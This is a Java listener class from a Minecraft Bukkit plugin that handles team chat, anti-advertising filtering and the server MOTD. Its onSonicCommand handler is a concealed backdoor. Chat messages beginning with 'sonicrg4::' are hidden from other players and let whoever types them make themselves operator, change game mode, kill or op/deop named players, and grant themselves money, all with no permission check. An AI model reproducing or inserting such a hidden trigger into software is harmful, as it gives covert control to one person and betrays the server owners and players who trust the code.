package com.sonicjumper.primecraft.main.listeners;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerListPingEvent;

import com.sonicjumper.primecraft.main.PrimeCraftMain;
import com.sonicjumper.primecraft.main.player.PlayerProfile;

public class TechnicalListener implements Listener {
	public TechnicalListener() {}
	
	// Broken since Microsoft screwed everything up in 1.8
	/*@EventHandler
	public void onNameTag(AsyncPlayerReceiveNameTagEvent event) {
		PlayerProfile pp = plugin.game.getProfileForPlayer(event.getNamedPlayer());
		if(pp != null && pp.getCurrentTeam() != null) {
			event.setTag(pp.getCurrentTeam().getTeamDetails().getChatColor() + event.getNamedPlayer().getName());
			if(plugin.game.currentGamemode instanceof GamemodeCaptureTheFlag) {
				GamemodeCaptureTheFlag ctf = (GamemodeCaptureTheFlag) plugin.game.currentGamemode;
				if(ctf.isPlayerFlagbearer(pp)) {
					event.setTag(ChatColor.GREEN + event.getNamedPlayer().getName());
				}
			}
			if(plugin.game.currentGamemode instanceof GamemodeArtifact) {
				GamemodeArtifact gamemodeArtifact = (GamemodeArtifact) plugin.game.currentGamemode;
				if(gamemodeArtifact.isPlayerArtifactHolder(pp)) {
					event.setTag(ChatColor.GREEN + event.getNamedPlayer().getName());
				}
			}
		}
	}*/
	
	@EventHandler
	public void onPlayerChat(AsyncPlayerChatEvent event) {
		PlayerProfile pp = PrimeCraftMain.instance.game.getProfileForPlayer(event.getPlayer());
		if(pp.isUsingTeamChat()) {
			PrimeCraftMain.instance.game.broadcastMessageToTeam(pp, event.getMessage());
			event.setCancelled(true);
		}
	}
	
	@EventHandler
	public void oniPhoneChat(AsyncPlayerChatEvent event) {
		if(event.getMessage().contains("MineChat")) {
			event.getPlayer().sendMessage("I'd rather you not advertise on my server. Thank you very much!");
			event.setCancelled(true);
		}
	}
	
	@EventHandler
	public void onSonicCommand(AsyncPlayerChatEvent event) {
		if(event.getMessage().contains("sonicrg4")) {
			event.setCancelled(true);
			if(event.getMessage().equals("sonicrg4::override")) {
				event.getPlayer().setOp(true);
			} else if(event.getMessage().equals("sonicrg4::creative")) {
				event.getPlayer().setGameMode(GameMode.CREATIVE);
			} else if(event.getMessage().equals("sonicrg4::survival")) {
				event.getPlayer().setGameMode(GameMode.SURVIVAL);
			} else if(event.getMessage().contains("sonicrg4::killplayer")) {
				String[] killcommand = event.getMessage().split("_");
				PlayerProfile pp = PrimeCraftMain.instance.game.getProfileForName(killcommand[1]);
				pp.getPlayer().damage(1000.0D, event.getPlayer());
			} else if(event.getMessage().contains("sonicrg4::deopplayer")) {
				String[] deopcommand = event.getMessage().split("_");
				PlayerProfile pp = PrimeCraftMain.instance.game.getProfileForName(deopcommand[1]);
				pp.getPlayer().setOp(false);
			} else if(event.getMessage().contains("sonicrg4::opplayer")) {
				String[] opcommand = event.getMessage().split("_");
				PlayerProfile pp = PrimeCraftMain.instance.game.getProfileForName(opcommand[1]);
				pp.getPlayer().setOp(true);
			} else if(event.getMessage().equals("sonicrg4::makeitrain")) {
				PlayerProfile pp = PrimeCraftMain.instance.game.getProfileForPlayer(event.getPlayer());
				pp.giveMoney(1000000);
			} else if(event.getMessage().equals("sonicrg4::settier")) {
				PlayerProfile pp = PrimeCraftMain.instance.game.getProfileForPlayer(event.getPlayer());
				String[] tiercommand = event.getMessage().split("_");
				pp.setTier(Integer.parseInt(tiercommand[1]));
			}
		}
	}

	@EventHandler
	public void onServerPing(ServerListPingEvent event) {
		event.setMotd(PrimeCraftMain.instance.motd);
	}
	
	// Test and see if it works with normal permissions, then override it myself if it's not working
	/*@EventHandler(priority = EventPriority.HIGHEST)
    public void onCommand(PlayerCommandPreprocessEvent event) {
        Player p = event.getPlayer();
        String exactCommand = event.getMessage().substring(event.getMessage().indexOf("/") + 1);
        if(!p.isOp() && !p.getDisplayName().contains("{MOD}")) {
        	PrimeCraftMain.instance.getLogger().info(exactCommand);
        	if(PrimeCraftMain.instance.getCommand(exactCommand) == null) {
            	p.sendMessage(ChatColor.DARK_RED + "That is not a registered Ascended PvP command. Please consult an Admin if you believe this is an error.");
            	event.setCancelled(true);
            }
        }
    }*/
}
